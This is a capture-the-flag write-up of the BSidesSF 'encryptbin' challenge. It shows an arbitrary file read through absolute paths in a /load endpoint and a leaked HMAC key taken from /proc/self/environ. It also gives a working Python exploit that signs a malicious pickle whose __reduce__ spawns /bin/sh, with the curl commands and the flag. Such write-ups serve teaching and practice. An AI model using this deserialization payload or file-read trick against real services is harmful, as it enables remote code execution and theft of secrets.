Looking through `main.js` noticed the paste is uploaded and a filename with a keyData retreived. The files are retrieved through the endpoint : 

>  var reqURI = '/load?file=' + encodeURIComponent(fileId);
    reqURI += '&key=' + encodeURIComponent(keyData);
    
So the files are encrypted, and a keyData is returned along with the file name and the keyData can be used to decrypt the file.

In the footer of the website we noticed, that the source file for the server is in `/home/ctf/main.py` which we requested through the above endpoint with a key(keyData)that we got 
from sending any paste on /upload endpoint. What happens is that the server tries to decrypt the file with the given key before sending it to us, but since the main.py isn't encrypted
it's just gonna decrypt a plaintext so we would need to encrypt to get the original.

To get the main.py : 
`curl 'https://encryptbin-12f88e53.challenges.bsidessf.net/load?file=/home/ctf/main.py&key=3gV_dA_omm24yNMMMiPelA%3D%3D!gAN9cQAoWAMAAABrZXlxAUMQLvejbKz4xN5yWtPHbnBOAHECWAIAAABpdnEDQwhXEvA5rtSpBnEEdS4%3D' --output - ``

Then we use pickle to deserialize the key data into a key and an IV (the first part is mac, it's seperated from the data by '!'). The IV is missing 8 bytes so we just tried to add 8 null bytes and tried different block cipher modes. CTR mode worked : 


```import flask
import uuid
import os
import io
import base64
import pickle
import json
import hmac
import hashlib

import crypter

app = flask.Flask(__name__)
app.config.from_object('config')


MAC_SEP = b'!'


def upload_data(cfg, fp):
    """Upload and encrypt data.

    Returns tuple of:
        - file_path
        - key as hex
        - iv as hex
    """
    os.makedirs(cfg['BASE_DIR'], mode=0o700, exist_ok=True)
    fname = str(uuid.uuid4())
    file_path = os.path.join(cfg['BASE_DIR'], fname)
    c = crypter.Crypter()
    with open(file_path, 'wb') as dst:
        c.encrypt(fp, dst)
    return fname, c.key, c.iv


def retrieve_data(cfg, fname, key, iv, dst=None):
    """Locate and decrypt data.

    Returns destination data.
    """
    if '..' in fname:
        raise ValueError('Directory traversal detected!')
    dst = dst or io.BytesIO()
    fpath = os.path.join(cfg['BASE_DIR'], fname)
    c = crypter.Crypter(key=key, iv=iv)
    with open(fpath, 'rb') as fp:
        c.decrypt(fp, dst)
    return dst


def pack_key(cfg, key, iv):
    """Pack a key and iv."""
    d = pickle.dumps({'key': key, 'iv': iv})
    mac = hmac.new(
            cfg['AUTH_KEY'].encode('utf-8'),
            msg=d,
            digestmod=hashlib.sha256).digest()[:16]
    return (
            base64.urlsafe_b64encode(mac) +
            MAC_SEP +
            base64.urlsafe_b64encode(d)).decode('utf-8')


def unpack_key(cfg, data):
    """Retrieve key and iv."""
    mac, d = data.encode('utf-8').split(MAC_SEP)
    mac = base64.urlsafe_b64decode(mac)
    d = base64.urlsafe_b64decode(d)
    expected = hmac.new(
            cfg['AUTH_KEY'].encode('utf-8'),
            msg=d,
            digestmod=hashlib.sha256).digest()[:16]
    if not hmac.compare_digest(mac, expected):
        app.logger.warn('Invalid MAC: ' + mac.hex() + ' ' + expected.hex())
        raise ValueError('Error deserializing pickled data: Invalid MAC')
    keyd = pickle.loads(d)
    return keyd['key'], keyd['iv']


def json_response(d):
    resp = flask.make_response(json.dumps(d))
    resp.headers.add('Content-type', 'application/json')
    return resp


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def index(path):
    return flask.render_template(
            'index.html',
            fname=os.path.abspath(__file__))


@app.route('/upload', methods=['POST'])
def upload():
    try:
        f = flask.request.form['paste']
    except KeyError:
        flask.abort(400)
    path, key, nonce = upload_data(app.config, io.BytesIO(f.encode('utf-8')))
    return json_response({
        'name': path,
        'key': pack_key(app.config, key, nonce),
    })


@app.route('/load')
def load_file():
    try:
        key = flask.request.args['key']
        path = flask.request.args['file']
    except (KeyError, ValueError):
        flask.abort(400)
    try:
        key, nonce = unpack_key(app.config, key)
    except Exception as ex:
        app.logger.warning('Error retrieving key: ' + str(ex))
        flask.abort(403, str(ex))
    try:
        fp = retrieve_data(app.config, path, key, nonce)
        fp.seek(0)
        resp = flask.make_response(fp.read())
        resp.headers.add('Content-type', 'application/octet-stream')
        return resp
    except FileNotFoundError:
        flask.abort(404)
    except PermissionError:
        flask.abort(403)
```

In the same way we got the config.py and crypter.py : 

```import io

from Crypto import Random
from Crypto.Cipher import AES


class Crypter(object):

    RNG = Random.new()
    KEY_LEN = 128//8

    def __init__(self, key=None, iv=None):
        self.key = key or self.RNG.read(self.KEY_LEN)
        self.iv = iv or self.RNG.read(8)
        assert(len(self.iv) <= 15)
        assert(len(self.key) in AES.key_size)
        self._cipher = AES.new(self.key, AES.MODE_CTR, nonce=self.iv)

    @property
    def hexkey(self):
        return self.key.hex()

    @property
    def hexiv(self):
        return self.iv.hex()

    @staticmethod
    def convert_src(s):
        if hasattr(s, 'read'):
            return s
        if isinstance(s, bytes):
            return io.BytesIO(s)
        raise TypeError("Unsupported type: " + type(s))

    def encrypt(self, src, dst):
        src = self.convert_src(src)
        while True:
            blk = src.read(4096)
            if not blk:
                try:
                    dst.flush()
                except:
                    pass
                return
            dst.write(self._cipher.encrypt(blk))

    def decrypt(self, src, dst):
        src = self.convert_src(src)
        while True:
            blk = src.read(4096)
            if not blk:
                try:
                    dst.flush()
                except:
                    pass
                return
            dst.write(self._cipher.decrypt(blk))
```


```import os

TEMPLATES_AUTO_RELOAD = True

# App specific configs
BASE_DIR = "/tmp/ebin"
AUTH_KEY = os.getenv("AUTH_KEY", "--auth-key--")
FLAG_PATH = "/home/flag/flag.txt"```


The `main.py` shows us that they're using an auth_key for the hmac so if we want to be able to have RCE through pickle (which is very vulnerable to that) we would need the 
auth_key which we found on `proc/self/environ`. It was `good_work_but_need_a_shell`. Now we can build our own pickle data, serialize it and send it as the key. 

Knowing that we just redircted the flag into a directory we can read from :

```import pickle
import base64
import hmac
import hashlib
import subprocess

MAC_SEP = b"!"

def pack_key():
    """Pack a key and iv."""
    d = pickle.dumps(RunBinSh())
    mac = hmac.new(
            'good_work_but_need_a_shell'.encode('utf-8'),
            msg=d,
            digestmod=hashlib.sha256).digest()[:16]
    return (
            base64.urlsafe_b64encode(mac) +
            MAC_SEP +
            base64.urlsafe_b64encode(d)).decode('utf-8')

class RunBinSh(object):
  def __reduce__(self):
        import subprocess
        return (subprocess.Popen, (('/bin/sh','-c','/home/flag/getflag > /tmp/flag'),0))

print(pack_key())```



Reading it was easy (encrypting just like before): 

`curl 'https://encryptbin-12f88e53.challenges.bsidessf.net/load?file=/tmp/flag&key=3gV_dA_omm24yNMMMiPelA%3D%3D!gAN9cQAoWAMAAABrZXlxAUMQLvejbKz4xN5yWtPHbnBOAHECWAIAAABpdnEDQwhXEvA5rtSpBnEEdS4%3D' --output - | hex`

It was `CTF{mmm_picklesftw}`.
